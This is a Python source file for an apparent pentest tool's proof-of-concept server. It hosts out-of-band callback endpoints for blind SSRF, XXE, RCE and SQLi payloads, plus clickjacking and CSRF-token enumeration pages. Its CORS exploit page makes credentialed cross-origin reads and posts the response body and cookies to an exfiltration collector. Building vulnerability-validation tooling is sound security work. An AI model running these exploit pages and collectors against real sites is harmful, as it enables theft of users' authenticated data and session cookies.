"""
BEATRIX PoC Server

Engine-managed async HTTP server that automates vulnerability validation:

1. **OOB Callback Receiver** — Catches blind SSRF/XXE/RCE/SQLi callbacks
   on a known local endpoint instead of relying on external interact.sh.
   Every scanner payload can point to http://{local_ip}:{port}/cb/{uid}
   and the server correlates the callback to the original test case.

2. **CORS PoC Hosting** — Serves per-finding exploit HTML pages at
   /poc/{finding_id} that perform authenticated cross-origin reads.
   The page exfiltrates stolen data back to /collect/{finding_id},
   proving exploitation end-to-end.

3. **Exfiltration Collector** — /collect/{id} endpoint logs what the
   PoC actually stole (response body, cookies, PII), auto-upgrading
   the finding's evidence and confidence.

4. **Nonce / Token Enumeration** — /enumerate endpoint serves a page
   that fetches the target N times, collects CSRF tokens / nonces,
   and posts them back to /enumerate/results for entropy analysis.

5. **Clickjacking Validator** — /clickjack/{url} serves a framing
   page to test X-Frame-Options / CSP frame-ancestors.

Lifecycle:
    The engine starts the server before Phase 3 (Delivery) and stops
    it after Phase 7 cleanup. Scanners access it via context["poc_server"].

Usage:
    async with PoCServer() as server:
        url = server.cors_poc_url(finding)
        callback = server.oob_url("ssrf", uid="abc123")
"""

import asyncio
import json
import secrets
import socket
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import parse_qs, unquote, urlparse


# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class OOBCallback:
    """A received out-of-band callback."""
    uid: str
    timestamp: datetime
    method: str
    path: str
    headers: Dict[str, str]
    body: str
    client_ip: str
    client_port: int
    # Correlation context (set when the payload was created)
    vuln_type: str = ""
    target_url: str = ""
    parameter: str = ""


@dataclass
class ExfilData:
    """Data exfiltrated by a PoC page."""
    finding_id: str
    timestamp: datetime
    data: str
    content_type: str = ""
    source_ip: str = ""


@dataclass
class EnumerationResult:
    """Token/nonce enumeration results."""
    target_url: str
    tokens: List[str] = field(default_factory=list)
    timestamps: List[float] = field(default_factory=list)
    entropy_score: float = 0.0
    predictable: bool = False


# ============================================================================
# CORS POC HTML TEMPLATES
# ============================================================================

CORS_POC_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC — {finding_title}</title>
  <style>
    body {{ font-family: monospace; background: #111; color: #0f0; padding: 20px; }}
    pre {{ white-space: pre-wrap; word-break: break-all; }}
    .status {{ color: #ff0; }}
    .error {{ color: #f00; }}
    .success {{ color: #0f0; }}
  </style>
</head>
<body>
  <h2>CORS Exploitation PoC</h2>
  <p>Target: <code>{target_url}</code></p>
  <p>Origin bypass: <code>{origin}</code></p>
  <div id="status" class="status">Sending cross-origin request...</div>
  <pre id="output"></pre>
  <script>
    var target = '{target_url}';
    var collectUrl = '{collect_url}';

    var xhr = new XMLHttpRequest();
    xhr.open('GET', target, true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {{
      if (xhr.readyState === 4) {{
        var statusEl = document.getElementById('status');
        var outputEl = document.getElementById('output');

        if (xhr.status > 0) {{
          statusEl.className = 'success';
          statusEl.textContent = 'Response received (HTTP ' + xhr.status + ')';
          outputEl.textContent = xhr.responseText;

          // Exfiltrate to our collector
          var exfil = new XMLHttpRequest();
          exfil.open('POST', collectUrl, true);
          exfil.setRequestHeader('Content-Type', 'application/json');
          exfil.send(JSON.stringify({{
            status: xhr.status,
            headers: xhr.getAllResponseHeaders(),
            body: xhr.responseText,
            cookies: document.cookie
          }}));
        }} else {{
          statusEl.className = 'error';
          statusEl.textContent = 'Request blocked by browser (CORS not exploitable from this origin)';
        }}
      }}
    }};
    xhr.onerror = function() {{
      document.getElementById('status').className = 'error';
      document.getElementById('status').textContent = 'Network error — CORS policy blocked the request';
    }};
    xhr.send();
  </script>
</body>
</html>"""

CLICKJACK_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    body {{ font-family: monospace; background: #111; color: #0f0; padding: 20px; }}
    iframe {{ width: 100%; height: 600px; border: 2px solid #0f0; opacity: 0.5; }}
    .overlay {{ position: absolute; top: 100px; left: 50px; z-index: 10;
                background: rgba(0,255,0,0.1); padding: 20px; border: 1px solid #0f0; }}
    #result {{ margin-top: 10px; }}
  </style>
</head>
<body>
  <h2>Clickjacking PoC</h2>
  <p>Target: <code>{target_url}</code></p>
  <div id="result" class="status"></div>
  <div class="overlay">
    <p>This overlay demonstrates that attackers can place invisible UI elements
       over the framed page to trick users into clicking.</p>
  </div>
  <iframe id="target-frame" src="{target_url}" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
  <script>
    var frame = document.getElementById('target-frame');
    var result = document.getElementById('result');
    frame.onload = function() {{
      result.style.color = '#f00';
      result.textContent = 'VULNERABLE: Page loaded in iframe — clickjacking is possible.';
      // Report back
      fetch('{collect_url}', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{frameable: true, url: '{target_url}'}})
      }});
    }};
    frame.onerror = function() {{
      result.style.color = '#0f0';
      result.textContent = 'PROTECTED: Page refused to load in iframe.';
    }};
    // Timeout fallback for X-Frame-Options blocking (no onerror fired)
    setTimeout(function() {{
      if (!result.textContent) {{
        try {{
          // Try accessing frame content — will throw if cross-origin or blocked
          var doc = frame.contentDocument || frame.contentWindow.document;
          if (doc && doc.body && doc.body.innerHTML.length > 0) {{
            result.style.color = '#f00';
            result.textContent = 'VULNERABLE: Page loaded in iframe — clickjacking is possible.';
          }}
        }} catch(e) {{
          result.style.color = '#ff0';
          result.textContent = 'INCONCLUSIVE: Could not determine frame status (cross-origin).';
        }}
      }}
    }}, 5000);
  </script>
</body>
</html>"""

ENUMERATE_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <title>Token Enumeration PoC</title>
  <style>
    body {{ font-family: monospace; background: #111; color: #0f0; padding: 20px; }}
    pre {{ white-space: pre-wrap; }}
    .predictable {{ color: #f00; font-weight: bold; }}
  </style>
</head>
<body>
  <h2>Nonce / CSRF Token Enumeration</h2>
  <p>Target: <code>{target_url}</code></p>
  <p>Fetching {iterations} tokens...</p>
  <pre id="output"></pre>
  <div id="result"></div>
  <script>
    var target = '{target_url}';
    var tokenRegex = {token_regex};
    var iterations = {iterations};
    var tokens = [];
    var outputEl = document.getElementById('output');
    var resultEl = document.getElementById('result');

    async function fetchToken(i) {{
      try {{
        var resp = await fetch(target, {{credentials: 'include', cache: 'no-store'}});
        var text = await resp.text();
        var match = text.match(tokenRegex);
        if (match) {{
          tokens.push({{index: i, token: match[1] || match[0], timestamp: Date.now()}});
          outputEl.textContent += 'Token ' + i + ': ' + (match[1] || match[0]) + '\\n';
        }} else {{
          outputEl.textContent += 'Token ' + i + ': (no match)\\n';
        }}
      }} catch(e) {{
        outputEl.textContent += 'Token ' + i + ': ERROR ' + e.message + '\\n';
      }}
    }}

    async function enumerate() {{
      for (var i = 0; i < iterations; i++) {{
        await fetchToken(i);
        await new Promise(r => setTimeout(r, 200));
      }}
      // Analyze and report
      var uniqueTokens = [...new Set(tokens.map(t => t.token))];
      var reused = tokens.length - uniqueTokens.length;
      var summary = {{
        total: tokens.length,
        unique: uniqueTokens.length,
        reused: reused,
        tokens: tokens,
        predictable: reused > 0 || analyzeEntropy(uniqueTokens)
      }};

      if (summary.predictable) {{
        resultEl.className = 'predictable';
        resultEl.textContent = 'VULNERABLE: Tokens show low entropy or reuse (' + reused + ' reused of ' + tokens.length + ')';
      }} else {{
        resultEl.textContent = 'Tokens appear random (' + uniqueTokens.length + ' unique of ' + tokens.length + ')';
      }}

      // Report back
      fetch('{results_url}', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(summary)
      }});
    }}

    function analyzeEntropy(tokens) {{
      if (tokens.length < 2) return false;
      // Check if sequential integers
      var nums = tokens.map(Number).filter(n => !isNaN(n));
      if (nums.length === tokens.length) {{
        var diffs = [];
        for (var i = 1; i < nums.length; i++) diffs.push(nums[i] - nums[i-1]);
        var allSame = diffs.every(d => d === diffs[0]);
        if (allSame) return true;
      }}
      // Check average token length (short = weak)
      var avgLen = tokens.reduce((s, t) => s + t.length, 0) / tokens.length;
      return avgLen < 8;
    }}

    enumerate();
  </script>
</body>
</html>"""

# ============================================================================
# THE POC SERVER
# ============================================================================

class PoCServer:
    """
    Engine-managed async HTTP server for automated PoC validation.

    Starts an aiohttp server on a free port. Provides:
    - /cb/{uid}          — OOB callback receiver
    - /poc/{finding_id}  — CORS exploit PoC pages
    - /collect/{id}      — Exfiltration data collector
    - /clickjack?url=X   — Clickjacking frame test
    - /enumerate?url=X&regex=R&n=N — Token enumeration
    - /enumerate/results — Token enumeration results
    - /health            — Health check

    Usage:
        async with PoCServer() as server:
            print(f"PoC server on {server.base_url}")
            cb_url = server.oob_url("ssrf", uid="abc")
            poc_url = server.register_cors_poc(finding)
    """

    DEFAULT_HOST = "0.0.0.0"
    DEFAULT_PORT = 0  # Auto-assign free port

    def __init__(
        self,
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        on_callback: Optional[Callable[[OOBCallback], Any]] = None,
        on_exfil: Optional[Callable[[ExfilData], Any]] = None,
    ):
        self.host = host
        self.port = port
        self._on_callback = on_callback
        self._on_exfil = on_exfil

        # State
        self._server: Optional[asyncio.AbstractServer] = None
        self._local_ip: Optional[str] = None
        self._bound_port: Optional[int] = None

        # OOB callback tracking
        self._oob_payloads: Dict[str, Dict[str, str]] = {}  # uid → context
        self._oob_callbacks: List[OOBCallback] = []

        # PoC pages
        self._poc_pages: Dict[str, str] = {}  # finding_id → HTML content

        # Exfiltration log
        self._exfil_log: List[ExfilData] = []

        # Enumeration results
        self._enum_results: Dict[str, EnumerationResult] = {}  # url → result

    # ================================================================
    # LIFECYCLE
    # ================================================================

    async def __aenter__(self) -> "PoCServer":
        await self.start()
        return self

    async def __aexit__(self, *args) -> None:
        await self.stop()

    async def start(self) -> None:
        """Start the HTTP server on a free port."""
        self._local_ip = self._detect_local_ip()

        self._server = await asyncio.start_server(
            self._handle_connection,
            self.host,
            self.port,
        )
        # Ensure the server is actively serving
        await self._server.start_serving()

        # Get the actual bound port (critical when port=0)
        sockets = self._server.sockets
        if sockets:
            self._bound_port = sockets[0].getsockname()[1]
            self.port = self._bound_port

    async def stop(self) -> None:
        """Shutdown the server."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._server = None

    @property
    def base_url(self) -> str:
        """Base URL of the running server."""
        ip = self._local_ip or "127.0.0.1"
        port = self._bound_port or self.port
        return f"http://{ip}:{port}"

    @property
    def bound_port(self) -> Optional[int]:
        return self._bound_port

    @property
    def is_running(self) -> bool:
        return self._server is not None

    # ================================================================
    # OOB CALLBACK MANAGEMENT
    # ================================================================

    def register_oob_payload(
        self,
        uid: str,
        vuln_type: str = "",
        target_url: str = "",
        parameter: str = "",
    ) -> str:
        """
        Register an OOB callback payload and return the callback URL.

        Scanners call this to get a URL they can inject into payloads.
        When the target server makes a request to this URL, the callback
        is logged and correlated to the original test case.
        """
        self._oob_payloads[uid] = {
            "vuln_type": vuln_type,
            "target_url": target_url,
            "parameter": parameter,
        }
        return f"{self.base_url}/cb/{uid}"

    def oob_url(self, vuln_type: str, uid: Optional[str] = None,
                target_url: str = "", parameter: str = "") -> str:
        """Generate and register an OOB callback URL."""
        if uid is None:
            uid = secrets.token_hex(8)
        return self.register_oob_payload(uid, vuln_type, target_url, parameter)

    def get_callbacks(self, uid: Optional[str] = None) -> List[OOBCallback]:
        """Get OOB callbacks, optionally filtered by uid."""
        if uid:
            return [cb for cb in self._oob_callbacks if cb.uid == uid]
        return list(self._oob_callbacks)

    def has_callback(self, uid: str) -> bool:
        """Check if a specific payload received a callback."""
        return any(cb.uid == uid for cb in self._oob_callbacks)

    @property
    def all_callbacks(self) -> List[OOBCallback]:
        return list(self._oob_callbacks)

    @property
    def callback_count(self) -> int:
        return len(self._oob_callbacks)

    # ================================================================
    # CORS POC MANAGEMENT
    # ================================================================

    def register_cors_poc(
        self,
        finding_id: str,
        target_url: str,
        origin: str = "https://evil.com",
        title: str = "CORS Misconfiguration",
    ) -> str:
        """
        Register a CORS PoC page and return its URL.

        The page will:
        1. Make a cross-origin credentialed request to target_url
        2. Display the response
        3. POST the stolen data to /collect/{finding_id}
        """
        collect_url = f"{self.base_url}/collect/{finding_id}"
        html = CORS_POC_TEMPLATE.format(
            finding_title=_html_escape(title),
            target_url=_html_escape(target_url),
            origin=_html_escape(origin),
            collect_url=collect_url,
        )
        self._poc_pages[finding_id] = html
        return f"{self.base_url}/poc/{finding_id}"

    def register_clickjack_poc(
        self,
        finding_id: str,
        target_url: str,
    ) -> str:
        """Register a clickjacking PoC page."""
        collect_url = f"{self.base_url}/collect/{finding_id}"
        html = CLICKJACK_TEMPLATE.format(
            target_url=_html_escape(target_url),
            collect_url=collect_url,
        )
        self._poc_pages[finding_id] = html
        return f"{self.base_url}/poc/{finding_id}"

    def register_custom_poc(self, finding_id: str, html: str) -> str:
        """Register a custom PoC HTML page."""
        self._poc_pages[finding_id] = html
        return f"{self.base_url}/poc/{finding_id}"

    # ================================================================
    # ENUMERATION
    # ================================================================

    def enumerate_url(
        self,
        target_url: str,
        token_regex: str = r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)',
        iterations: int = 20,
    ) -> str:
        """
        Return a URL that serves the nonce/token enumeration page.
        """
        # Store URL-safe key
        key = secrets.token_hex(6)
        results_url = f"{self.base_url}/enumerate/results?key={key}"
        html = ENUMERATE_TEMPLATE.format(
            target_url=_html_escape(target_url),
            token_regex=_js_regex(token_regex),
            iterations=iterations,
            results_url=results_url,
        )
        self._poc_pages[f"enum_{key}"] = html
        # Pre-register the result slot
        self._enum_results[key] = EnumerationResult(target_url=target_url)
        return f"{self.base_url}/poc/enum_{key}"

    def get_enumeration_results(self, key: str) -> Optional[EnumerationResult]:
        return self._enum_results.get(key)

    # ================================================================
    # EXFILTRATION LOG
    # ================================================================

    def get_exfil_data(self, finding_id: Optional[str] = None) -> List[ExfilData]:
        """Get exfiltrated data, optionally filtered by finding ID."""
        if finding_id:
            return [d for d in self._exfil_log if d.finding_id == finding_id]
        return list(self._exfil_log)

    def has_exfil(self, finding_id: str) -> bool:
        """Check if a PoC successfully exfiltrated data."""
        return any(d.finding_id == finding_id for d in self._exfil_log)

    # ================================================================
    # HTTP REQUEST HANDLER
    # ================================================================

    async def _handle_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Handle an incoming HTTP connection."""
        addr = writer.get_extra_info("peername") or ("0.0.0.0", 0)
        try:
            # Read the request (up to 64KB)
            raw = await asyncio.wait_for(reader.read(65536), timeout=10.0)
            if not raw:
                return

            request_text = raw.decode("utf-8", errors="replace")
            method, path, headers, body = self._parse_http(request_text)

            # Route
            if path == "/health":
                await self._respond(writer, 200, {"status": "ok", "callbacks": self.callback_count})
            elif path.startswith("/cb/"):
                await self._handle_oob_callback(writer, method, path, headers, body, addr)
            elif path.startswith("/poc/"):
                await self._handle_poc_page(writer, path)
            elif path.startswith("/collect/"):
                await self._handle_collect(writer, method, path, headers, body, addr)
            elif path.startswith("/enumerate/results"):
                await self._handle_enum_results(writer, method, path, headers, body)
            elif path.startswith("/clickjack"):
                await self._handle_clickjack(writer, path)
            elif path.startswith("/enumerate"):
                await self._handle_enumerate(writer, path)
            else:
                await self._respond(writer, 404, {"error": "not found"})

        except asyncio.TimeoutError:
            pass
        except Exception:
            try:
                await self._respond(writer, 500, {"error": "internal server error"})
            except Exception:
                pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    # ================================================================
    # ROUTE HANDLERS
    # ================================================================

    async def _handle_oob_callback(
        self, writer, method: str, path: str, headers: Dict, body: str, addr: tuple,
    ) -> None:
        """Handle /cb/{uid} — OOB callback receiver."""
        uid = path.split("/cb/", 1)[1].split("?")[0].split("/")[0]

        context = self._oob_payloads.get(uid, {})
        callback = OOBCallback(
            uid=uid,
            timestamp=datetime.now(),
            method=method,
            path=path,
            headers=headers,
            body=body,
            client_ip=addr[0],
            client_port=addr[1],
            vuln_type=context.get("vuln_type", ""),
            target_url=context.get("target_url", ""),
            parameter=context.get("parameter", ""),
        )
        self._oob_callbacks.append(callback)

        if self._on_callback:
            try:
                result = self._on_callback(callback)
                if asyncio.iscoroutine(result):
                    await result
            except Exception:
                pass

        # Always return 200 to confirm receipt
        await self._respond(writer, 200, {
            "status": "callback received",
            "uid": uid,
        })

    async def _handle_poc_page(self, writer, path: str) -> None:
        """Handle /poc/{finding_id} — serve PoC HTML pages."""
        finding_id = path.split("/poc/", 1)[1].split("?")[0]
        html = self._poc_pages.get(finding_id)

        if html:
            await self._respond_html(writer, 200, html)
        else:
            await self._respond(writer, 404, {"error": f"No PoC registered for '{finding_id}'"})

    async def _handle_collect(
        self, writer, method: str, path: str, headers: Dict, body: str, addr: tuple,
    ) -> None:
        """Handle /collect/{id} — exfiltration data collector."""
        finding_id = path.split("/collect/", 1)[1].split("?")[0]

        # Accept both GET (query params) and POST (body)
        data = body
        if method == "GET" and "?" in path:
            data = path.split("?", 1)[1]

        exfil = ExfilData(
            finding_id=finding_id,
            timestamp=datetime.now(),
            data=data,
            content_type=headers.get("content-type", ""),
            source_ip=addr[0],
        )
        self._exfil_log.append(exfil)

        if self._on_exfil:
            try:
                result = self._on_exfil(exfil)
                if asyncio.iscoroutine(result):
                    await result
            except Exception:
                pass

        # CORS headers so the PoC page can POST here
        await self._respond(writer, 200, {"status": "collected"}, cors=True)

    async def _handle_clickjack(self, writer, path: str) -> None:
        """Handle /clickjack?url=X — dynamic clickjacking test."""
        qs = parse_qs(urlparse(path).query)
        target_url = qs.get("url", [""])[0]
        if not target_url:
            await self._respond(writer, 400, {"error": "Missing 'url' parameter"})
            return

        fid = secrets.token_hex(6)
        collect_url = f"{self.base_url}/collect/{fid}"
        html = CLICKJACK_TEMPLATE.format(
            target_url=_html_escape(target_url),
            collect_url=collect_url,
        )
        await self._respond_html(writer, 200, html)

    async def _handle_enumerate(self, writer, path: str) -> None:
        """Handle /enumerate?url=X&regex=R&n=N — dynamic token enumeration."""
        qs = parse_qs(urlparse(path).query)
        target_url = qs.get("url", [""])[0]
        if not target_url:
            await self._respond(writer, 400, {"error": "Missing 'url' parameter"})
            return

        regex = qs.get("regex", [r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)'])[0]
        iterations = int(qs.get("n", ["20"])[0])
        key = secrets.token_hex(6)
        results_url = f"{self.base_url}/enumerate/results?key={key}"

        self._enum_results[key] = EnumerationResult(target_url=target_url)
        html = ENUMERATE_TEMPLATE.format(
            target_url=_html_escape(target_url),
            token_regex=_js_regex(regex),
            iterations=iterations,
            results_url=results_url,
        )
        await self._respond_html(writer, 200, html)

    async def _handle_enum_results(
        self, writer, method: str, path: str, headers: Dict, body: str,
    ) -> None:
        """Handle /enumerate/results — receive token enumeration data."""
        qs = parse_qs(urlparse(path).query)
        key = qs.get("key", [""])[0]

        if method == "POST" and body:
            try:
                data = json.loads(body)
                result = self._enum_results.get(key)
                if result:
                    result.tokens = [t.get("token", "") for t in data.get("tokens", [])]
                    result.timestamps = [t.get("timestamp", 0) for t in data.get("tokens", [])]
                    result.predictable = data.get("predictable", False)
                    # Calculate entropy score
                    unique = len(set(result.tokens))
                    total = len(result.tokens) or 1
                    result.entropy_score = unique / total
            except (json.JSONDecodeError, AttributeError):
                pass

        await self._respond(writer, 200, {"status": "received"}, cors=True)

    # ================================================================
    # HTTP RESPONSE HELPERS
    # ================================================================

    async def _respond(
        self, writer, status: int, body: dict, cors: bool = False,
    ) -> None:
        """Send a JSON HTTP response."""
        payload = json.dumps(body).encode()
        headers = [
            f"HTTP/1.1 {status} {_status_text(status)}",
            "Content-Type: application/json",
            f"Content-Length: {len(payload)}",
            "Connection: close",
        ]
        if cors:
            headers.extend([
                "Access-Control-Allow-Origin: *",
                "Access-Control-Allow-Methods: GET, POST, OPTIONS",
                "Access-Control-Allow-Headers: Content-Type",
            ])
        response = "\r\n".join(headers) + "\r\n\r\n"
        writer.write(response.encode() + payload)
        await writer.drain()

    async def _respond_html(self, writer, status: int, html: str) -> None:
        """Send an HTML HTTP response."""
        payload = html.encode()
        headers = [
            f"HTTP/1.1 {status} {_status_text(status)}",
            "Content-Type: text/html; charset=utf-8",
            f"Content-Length: {len(payload)}",
            "Connection: close",
        ]
        response = "\r\n".join(headers) + "\r\n\r\n"
        writer.write(response.encode() + payload)
        await writer.drain()

    # ================================================================
    # INTERNAL HELPERS
    # ================================================================

    @staticmethod
    def _parse_http(raw: str) -> tuple:
        """Parse raw HTTP request into (method, path, headers_dict, body)."""
        parts = raw.split("\r\n\r\n", 1)
        header_section = parts[0]
        body = parts[1] if len(parts) > 1 else ""

        lines = header_section.split("\r\n")
        request_line = lines[0] if lines else "GET / HTTP/1.1"
        tokens = request_line.split(" ", 2)
        method = tokens[0] if tokens else "GET"
        path = tokens[1] if len(tokens) > 1 else "/"

        headers: Dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                key, val = line.split(":", 1)
                headers[key.strip().lower()] = val.strip()

        return method, path, headers, body

    @staticmethod
    def _detect_local_ip() -> str:
        """Detect the machine's local IP address."""
        try:
            # Connect to a public DNS to determine local IP (no actual traffic)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def summary(self) -> Dict[str, Any]:
        """Return a summary of server activity."""
        return {
            "base_url": self.base_url,
            "running": self.is_running,
            "oob_payloads_registered": len(self._oob_payloads),
            "oob_callbacks_received": len(self._oob_callbacks),
            "poc_pages_registered": len(self._poc_pages),
            "exfil_entries": len(self._exfil_log),
            "enum_results": len(self._enum_results),
            "callbacks": [
                {
                    "uid": cb.uid,
                    "vuln_type": cb.vuln_type,
                    "target_url": cb.target_url,
                    "parameter": cb.parameter,
                    "client_ip": cb.client_ip,
                    "timestamp": cb.timestamp.isoformat(),
                }
                for cb in self._oob_callbacks
            ],
        }


# ============================================================================
# MODULE-LEVEL HELPERS
# ============================================================================

def _html_escape(s: str) -> str:
    """Minimal HTML escaping."""
    return (s
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"))


def _js_regex(pattern: str) -> str:
    """Convert a Python regex string to a JavaScript regex literal."""
    # Escape forward slashes for JS
    escaped = pattern.replace("/", "\\/")
    return f"/{escaped}/i"


def _status_text(code: int) -> str:
    """HTTP status text."""
    return {
        200: "OK",
        400: "Bad Request",
        404: "Not Found",
        500: "Internal Server Error",
    }.get(code, "OK")
